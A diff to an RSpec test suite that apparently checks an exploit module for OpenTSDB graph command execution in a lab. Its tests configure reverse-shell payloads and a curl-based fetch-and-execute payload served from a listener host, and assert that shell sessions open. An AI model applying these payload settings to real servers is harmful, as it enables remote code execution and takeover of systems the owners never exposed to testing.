@@ -62,7 +62,9 @@ RSpec.describe 'Genuine OpenTSDB graph execution targets' do
       it "does not execute forced #{service} commands twice" do
         2.times do
           with_proof do |path|
+            offset = executing_inputs.length
             output = invoke(service, command_options("/usr/bin/touch #{path}").merge('AutoCheck' => false), allow_errors: true)
+            expect(executing_inputs.length - offset).to eq(1)
             expect(output).not_to match(/session \d+ opened/)
             expect_no_proof(path)
           end
@@ -170,22 +172,41 @@ RSpec.describe 'Genuine OpenTSDB graph execution targets' do
         sessions_twice('cmd/linux/http/x64/shell_reverse_tcp', 'FETCH_COMMAND' => 'WGET', 'FETCH_DELETE' => true)
       end
 
-      it 'opens and uses Unix Bash shells twice with AutoCheck' do
-        sessions_twice('cmd/unix/reverse_bash', 'AutoCheck' => true)
+      it 'opens and uses Linux x86 Fetch curl shells twice with AutoCheck' do
+        sessions_twice('cmd/linux/http/x86/shell_reverse_tcp', 'AutoCheck' => true, 'FETCH_COMMAND' => 'CURL', 'FETCH_DELETE' => true)
       end
     end
   end
 
   def invoke(service, options = {}, action: 'run -z', allow_errors: false)
     values = { 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true, 'TARGETURI' => '/' }
-    values.merge!('TARGETURI' => '/tsdb/', 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password') if service == 'gateway'
+    # The owners deliberately send commands with timeout0. This existing
+    # public option permits reading the Basic challenge and negotiating auth.
+    values.merge!('TARGETURI' => '/tsdb/', 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password', 'HttpClientTimeout' => 5) if service == 'gateway'
+    if action != 'check' && options['PAYLOAD']
+      target_index = options.fetch('TARGET', 0)
+      target = @catalog.fetch(owner).fetch('targets').fetch(target_index)
+      expect(target.fetch('compatible_payloads')).to include(options.fetch('PAYLOAD'))
+      append('opentsdb-compatibility', target: target.fetch('name'), payload: options.fetch('PAYLOAD'), compatible: true)
+    end
     output = run_target_module(owner, service, values.merge(options), action: action, allow_errors: allow_errors, command_timeout: 90)
     expect(output).not_to match(/Unknown datastore option|NoMethodError|NameError|TypeError|ArgumentError|RuntimeError/)
     output
   end
 
   def command_options(command)
-    { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }
+    return { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 } if family == 'yrange'
+
+    # The key owner declares Linux-only command payloads. Exercise a genuine
+    # public Linux Fetch exec adapter instead of bypassing Unix incompatibility.
+    {
+      'TARGET' => 0, 'PAYLOAD' => 'cmd/linux/http/x64/exec', 'CMD' => command,
+      'DisablePayloadHandler' => false, 'WfsDelay' => 5,
+      'FETCH_COMMAND' => 'CURL', 'FETCH_DELETE' => true,
+      'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => 8083,
+      'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => 'module-target-opentsdb-command',
+      'SRVHOST' => listener_host, 'SRVPORT' => 8082
+    }
   end
 
   def command_twice_body(service, value)
@@ -196,8 +217,19 @@ RSpec.describe 'Genuine OpenTSDB graph execution targets' do
       inputs = executing_inputs.drop(offset)
       expect(inputs.length).to eq(1)
       expect(Base64.strict_decode64(inputs.first.fetch('datastore_command'))).to eq(command)
-      expect(Base64.strict_decode64(inputs.first.fetch('command'))).to eq(command)
+      argument = Base64.strict_decode64(inputs.first.fetch('command'))
+      if family == 'yrange'
+        expect(argument).to eq(command)
+      else
+        expect(argument).to include('module-target-opentsdb-command')
+        expect(argument).to match(/curl\b/)
+        expect(inputs.first.fetch('payload')).to eq('cmd/linux/http/x64/exec')
+      end
       wait_for_proof(path, value)
+      if family == 'key'
+        wait_until { expect(target_exec('affected', 'sh', '-c', 'if test -e /tmp/module-target-opentsdb-command; then printf exists; fi')).to eq('') }
+        prove_ports_removed
+      end
     end
   end
 
